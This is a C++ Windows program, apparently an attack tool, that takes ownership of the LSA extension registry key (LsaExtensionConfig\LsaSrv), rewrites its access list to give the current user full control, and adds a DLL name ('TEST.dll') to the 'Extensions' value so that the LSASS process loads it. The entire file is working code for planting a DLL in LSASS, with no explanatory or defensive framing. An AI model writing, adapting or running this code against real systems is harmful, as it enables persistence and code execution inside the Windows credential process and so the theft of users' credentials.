#include <iostream>
#include <Windows.h>
#include <AclAPI.h>
#include <vector>
#include <sddl.h>

#define LSASVR_KEY TEXT("SYSTEM\\CurrentControlSet\\Control\\LsaExtensionConfig\\LsaSrv")

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege,  BOOL bEnablePrivilege);
const PSID GetUserSid();
BOOL UpdateRegKeyDACL(HKEY hKey, PSID pSid);
BOOL WriteRegKey(HKEY hKey);

int main() {

	HANDLE hToken;
	HKEY hKey;

	//======== OPEN REG KEY ==========================

	auto lStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, LSASVR_KEY, 0, KEY_READ, &hKey);
	if (lStatus == ERROR_SUCCESS) {
		printf("[+] Opened Reg Key for KEY_READ.\n");
	}
	else {
		printf("[-] Could not open reg key. Check access rights.\n");
		return 1;
	}

	//========== ADJUST TOKEN PRIV =========================

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		printf("[-] OpenProcessToken error: %u\n", GetLastError());
		return 1;
	}

	if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE)) {
		printf("[-] SetPrivilege error: %u\n", GetLastError());
		return 1;
	}

	//============ GET CURRENT USER SID =======================

	PSID pUserSid = GetUserSid();
	if (pUserSid) {
		LPTSTR ownerSidString;
		ConvertSidToStringSid(pUserSid, &ownerSidString);
		printf("[+] Current user SID: %ws\n", ownerSidString);
	}

	// ============ UPDATE REG KEY OWNER =======================

	auto dwStatus = SetSecurityInfo(hKey, SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION, pUserSid, NULL, NULL, NULL);
	if (dwStatus == ERROR_SUCCESS) {
		printf("[+] SetSecurityInfo success.\n");
	}
	else { printf("[-] SetSecurityInfo fail: %d\n", GetLastError()); return 1; }

	// ============== REOPEN REG KEY WITH WRITE_DAC ACCESS RIGHTS ===================================

	lStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, LSASVR_KEY, 0, WRITE_DAC | READ_CONTROL, &hKey);
	if (lStatus == ERROR_SUCCESS) {
		printf("[+] Opened Reg Key for WRITE_DAC.\n");
	}
	else {
		printf("[-] Could not open reg key. Check access rights.\n");
		return 1;
	}

	// ============== ADJUST KEY DACL =====================

	if (!UpdateRegKeyDACL(hKey, pUserSid)) {
		printf("[-] UpdateRegKeyDACL error.\n");
		return 1;
	}
	else {
		printf("[+] Registry key DACL was updated.\n");
	}

	// ============== REOPEN WITH KEY_ALL_ACCESS ==============

	lStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE, LSASVR_KEY, 0, KEY_ALL_ACCESS, &hKey);
	if (lStatus == ERROR_SUCCESS) {
		printf("[+] Opened Reg Key for KEY_ALL_ACCESS.\n");
	}
	else {
		printf("[-] Could not open reg key. Check access rights.\n");
		return 1;
	}

	// =============== UPDARE REG KEY VALUE DATA ===============

	if (!WriteRegKey(hKey)) {
		printf("[-] WriteRegKey error.\n");
	}
	else {
		printf("[+] Updated Registry Key Value Data.\n");
	}

	// ========== CLOSE REG KEY =============
    
	RegCloseKey(hKey);
	return 0;
}

BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege,  BOOL bEnablePrivilege) {

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	else {
		tp.Privileges[0].Attributes = 0;
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[-] The token does not have the specified privilege.\n");
		return FALSE;
	}

	return TRUE;
}

const PSID GetUserSid() {

	PSID pSid = NULL;
	HANDLE hToken = NULL;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &hToken)) { printf("[-] OpenProcessToken failed.\n"); return NULL; }

	DWORD dwSidBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSidBufferSize)) {
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
			printf("[-] GetTokenInformation error: %u\n", GetLastError());
			return NULL;
		}
	}

	std::vector<BYTE> buffer;
	buffer.resize(dwSidBufferSize);
	PTOKEN_USER pTokenUser = reinterpret_cast<PTOKEN_USER>(&buffer[0]);

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSidBufferSize, &dwSidBufferSize)) {
		printf("[-] GetTokenInformation error: %u\n", GetLastError());
		return NULL;
	}

	if (!IsValidSid(pTokenUser->User.Sid)) {
		printf("[-] The owner SID is invalid.\n");
		return NULL;
	}

	DWORD dwSidLenght = GetLengthSid(pTokenUser->User.Sid);
	pSid = malloc(dwSidLenght);
	if (pSid) {
		CopySid(dwSidLenght, pSid, pTokenUser->User.Sid);
	}

	CloseHandle(hToken);

	return pSid;
}

BOOL UpdateRegKeyDACL(HKEY hKey, PSID pSid) {

	SECURITY_INFORMATION si = DACL_SECURITY_INFORMATION;
	DWORD dwSdSizeNeeded = 1;
	PSECURITY_DESCRIPTOR psd;
	PSECURITY_DESCRIPTOR psdNew;
	PACL pDacl;
	BOOL bDaclPresent;
	BOOL bDaclExist;
	ACL_SIZE_INFORMATION aclSizeInfo;
	DWORD dwNewAclSize;
	PACL pNewDacl;
	ACCESS_ALLOWED_ACE* pace = NULL;
	int i;
	PVOID pTempAce;

	auto lResult = RegGetKeySecurity(hKey, si, 0, &dwSdSizeNeeded);
	if (lResult == ERROR_INSUFFICIENT_BUFFER) {
		psd = LocalAlloc(LMEM_FIXED, dwSdSizeNeeded);
		psdNew = LocalAlloc(LMEM_FIXED, dwSdSizeNeeded);
		if (psd == NULL || psdNew == NULL) { printf("[-] LocalAlloc failed.\n"); return FALSE; }
	}
	else { printf("[-] RegGetKeySecurity failed.\n"); return FALSE; }

	lResult = RegGetKeySecurity(hKey, si, psd, &dwSdSizeNeeded);
	if (lResult != ERROR_SUCCESS) { printf("[-] RegGetKeySecurity second call failed.\n"); return FALSE; }

	if (!InitializeSecurityDescriptor(psdNew, SECURITY_DESCRIPTOR_REVISION)) { printf("[-] Failed to initialize psdNew.\n"); return FALSE; }

	if (!GetSecurityDescriptorDacl(psd, &bDaclPresent, &pDacl, &bDaclExist)) { printf("[-] GetSecurityDesciptorDacl failed.\n"); return FALSE; }

	ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));
	aclSizeInfo.AclBytesInUse = sizeof(ACL);

	if (pDacl != NULL) {
		if (!GetAclInformation(pDacl, (LPVOID)&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION), AclSizeInformation)) { printf("[-] GetAclInformation failed.\n"); return FALSE; }
	}

	dwNewAclSize = aclSizeInfo.AclBytesInUse + sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(pSid) - sizeof(DWORD);
	pNewDacl = (PACL)LocalAlloc(LMEM_FIXED, dwNewAclSize);
	if (pNewDacl == NULL) { printf("[-] LocalAlloc failed.\n"); return 1; }

	if (!InitializeAcl(pNewDacl, dwNewAclSize, ACL_REVISION)) { printf("[-] failed to initialize new DACL\n"); }

	pace = (ACCESS_ALLOWED_ACE*)LocalAlloc(LMEM_FIXED, sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(pSid) - sizeof(DWORD));
	if (pace == NULL) { printf("[-] LocalAlloc failed.\n"); return 1; }
	pace->Header.AceType = ACCESS_ALLOWED_ACE_TYPE;
	pace->Header.AceFlags = CONTAINER_INHERIT_ACE;
	pace->Header.AceSize = LOWORD(sizeof(ACCESS_ALLOWED_ACE) + GetLengthSid(pSid) - sizeof(DWORD));
	pace->Mask = KEY_ALL_ACCESS;

	if (!CopySid(GetLengthSid(pSid), &pace->SidStart, pSid)) { printf("[-] CopySid failed.\n"); }
	if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, (LPVOID)pace, pace->Header.AceSize)) { printf("[-] AddAce failed.\n"); }

	if (bDaclPresent) {
		if (aclSizeInfo.AceCount) {
			for (i = 0; i < aclSizeInfo.AceCount; i++) {
				if (!GetAce(pDacl, i, &pTempAce)) { return 1; }
				if (!AddAce(pNewDacl, ACL_REVISION, MAXDWORD, pTempAce, ((PACE_HEADER)pTempAce)->AceSize)) { return FALSE; }
			}
		}
	}

	if (!SetSecurityDescriptorDacl(psdNew, TRUE, pNewDacl, FALSE)) { printf("[-] SetSecurityDescriptorDacl failed.\n"); return FALSE; }
	si |= PROTECTED_DACL_SECURITY_INFORMATION;
	if (RegSetKeySecurity(hKey, si, psdNew) != ERROR_SUCCESS) { printf("[-] RegSetKeySecurity failed.\n"); return FALSE; }

	if (pace != NULL)
		LocalFree((LPVOID)pace);
	if (pNewDacl != NULL)
		LocalFree((LPVOID)pNewDacl);
	if (psd != NULL)
		LocalFree((LPVOID)psd);
	if (psdNew != NULL)
		LocalFree((LPVOID)psdNew);

	return TRUE;
}

BOOL WriteRegKey(HKEY hKey) {

	char data[100] = { 0 };
	char new_value[9] = "TEST.dll";
	LONG lReturnStatus;
	DWORD dwType;
	DWORD dwBufferSize = sizeof(data);

	lReturnStatus = RegGetValueA(hKey, NULL, "Extensions", RRF_RT_ANY, &dwType, (LPVOID)&data, &dwBufferSize);
	if (lReturnStatus != ERROR_SUCCESS) {
		printf("[-] RegGetValueA error: %u\n", GetLastError());
		return FALSE;
	}

	int start_index = 0;
	int end_index = 0;

	for (int i = 0; i < sizeof(data); i++) {
		if (data[i] == '\0' && data[i + 1] == '\0') {
			start_index = i + 1;
			break;
		}
	}

	for (int j = 0; j < sizeof(new_value); j++) {
		data[start_index + j] = new_value[j];
	}

	end_index = start_index + sizeof(new_value);

	for (int i = end_index; i < sizeof(data); i++) {
		data[i] = '\0';
	}

	lReturnStatus = RegSetKeyValueA(hKey, NULL, "Extensions", REG_MULTI_SZ, data, sizeof(data));
	if (lReturnStatus != ERROR_SUCCESS) {
		printf("[-] RegSetKeyValueA error: %u\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
